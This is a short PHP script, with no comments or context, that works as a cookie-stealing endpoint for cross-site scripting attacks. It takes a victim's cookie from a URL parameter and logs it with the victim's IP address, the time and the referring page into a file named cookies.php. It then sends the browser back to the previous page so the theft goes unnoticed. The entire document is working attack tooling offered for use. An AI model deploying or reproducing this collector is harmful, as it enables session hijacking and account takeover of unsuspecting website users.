<?php
  $cookie = $_GET["c"];
  $date = date("j F, Y, g:i a");
  $referer = getenv('HTTP_REFERER');
  $ip = $_SERVER['REMOTE_ADDR'];
  $file = fopen('cookies.php', 'wa+');
  fwrite($file, "Cookie: $cookie \n" . 
  		"IP: $ip \n" . 
		"Date and time: $date \n" . 
		"Referer: $referer \n");
  fclose($file);
  //header("Location: " . $_SERVER['HTTP_REFERER']);
  //exit;
  header("location:javascript://history.go(-1)");
  exit;
?>  
